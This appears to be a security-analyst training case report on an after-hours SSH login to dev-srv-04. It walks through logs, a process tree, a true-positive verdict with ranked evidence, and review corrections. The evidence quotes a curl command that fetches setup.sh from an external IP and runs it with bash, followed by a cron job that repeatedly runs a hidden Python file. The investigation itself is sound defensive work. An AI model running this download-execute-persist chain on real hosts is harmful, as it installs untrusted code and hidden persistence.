# W8-C6 — Suspicious Commands and End-to-End Investigation

**Date:** 2026-11-10 · **Host:** dev-srv-04 · **User:** tariq · **Time spent:** 60 min
**Alert:** Script downloaded from an external host and executed; new cron job created

## Evidence
```
auth.log
Nov 10 22:47:15 dev-srv-04 sshd[8790]: Failed password for tariq from 10.10.5.88 port 44102 ssh2
Nov 10 22:47:29 dev-srv-04 sshd[8790]: Accepted password for tariq from 10.10.5.88 port 44102 ssh2
Nov 10 22:47:29 dev-srv-04 sshd[8790]: pam_unix(sshd:session): session opened for user tariq by (uid=0)
Nov 10 23:12:40 dev-srv-04 sshd[8790]: pam_unix(sshd:session): session closed for user tariq

Process snapshot
TIME      USER   PID   PPID  COMMAND
22:47:29  tariq  8801  8790  sshd: tariq@pts/2
22:47:30  tariq  8802  8801  -bash
22:49:12  tariq  8840  8802  /usr/bin/curl -fsSL https://198.51.100.14/setup.sh -o /tmp/setup.sh
22:49:20  tariq  8845  8802  /bin/bash /tmp/setup.sh
22:49:21  tariq  8846  8845  /usr/bin/crontab /tmp/.cronjob
22:49:22  tariq  8847  8845  /usr/bin/python3 /tmp/.upd.py

syslog
Nov 10 23:00:01 dev-srv-04 CRON[8902]: (tariq) CMD (/usr/bin/python3 /tmp/.upd.py)
Nov 10 23:05:01 dev-srv-04 CRON[8915]: (tariq) CMD (/usr/bin/python3 /tmp/.upd.py)
Nov 10 23:10:01 dev-srv-04 CRON[8931]: (tariq) CMD (/usr/bin/python3 /tmp/.upd.py)
```
**SIEM Notes:** (1) `tariq` is a backend developer; his logins in the previous 30 days were all 09:00–17:00. (2) `198.51.100.14` has no reputation data and no prior activity here. (3) Network summary: `dev-srv-04` contacted `198.51.100.14:443` at 22:49 and then every 5 minutes (raw logs not provided). (4) `/tmp/setup.sh`, `/tmp/.cronjob` and `/tmp/.upd.py` were not collected.

## Process tree
```
sshd (8790)
└── sshd: tariq@pts/2 (8801)
    └── -bash (8802)
        ├── curl https://198.51.100.14/setup.sh (8840)
        └── bash /tmp/setup.sh (8845)
            ├── crontab /tmp/.cronjob (8846)
            └── python3 /tmp/.upd.py (8847)
```

## Final report
**Verdict:** TP · **Confidence:** High · **Impact:** Execution + persistence: Confirmed / Data impact: Unknown · **Action:** Escalate

**Executive Summary.** On 2026-11-10 at 22:47, `tariq`, whose logins over the previous 30 days were all within working hours, logged in by SSH from 10.10.5.88 after one failed password. About two minutes later his session downloaded `setup.sh` from an external IP (198.51.100.14) with curl, ran it from `/tmp`, installed a cron job from a hidden file and started `/tmp/.upd.py`, which cron then executed every five minutes. A network summary shows contact with the same IP on the same schedule, but the script contents and raw network logs were not collected. Assessment: True Positive with High confidence, based on several independent indicators (out-of-baseline timing, external download-and-execute, hidden files in `/tmp`, persistence that actually ran); data impact and whether the account itself was compromised remain unverified.

**Evidence ranking**
- Strong: three CRON entries five minutes apart (persistence executed); the curl → bash → crontab/python chain under tariq's session (PID/PPID).
- Medium: login outside the 30-day baseline (anomalous, not proof by itself); network summary showing periodic contact (summary only).
- Weak: Note 2 (unknown reputation is not the same as malicious).

**Benign explanation:** a developer fetching a setup script for an approved task. It does not explain the hidden files in `/tmp`, the out-of-hours login or a five-minute recurring job.
**Missing evidence:** contents of the three files; whether `setup.sh` created the other two; whether 10.10.5.88 is tariq's usual device; raw network logs; any ticket or approval; whether his credentials were stolen.
**What would change my mind:** the scripts are an approved tool covered by a ticket, the IP belongs to an approved vendor, and no sensitive data leaves the host.

## Evolution
- **First submission:** TP, High, Impact Confirmed.
- **Issues found in review:** the summary used 10.10.5.52 (an address from W8-C5) instead of 10.10.5.88; the cron job was called a "service"; claimed tariq downloaded `.cronjob` and `.upd.py` (only `setup.sh` was downloaded in the log); Impact needed to separate execution/persistence (confirmed) from data impact (unknown).
- Self-reported AI assistance on this case: about 2% (one simple question).

**Lesson:** several independent indicators can justify High confidence; impact still has to be split.
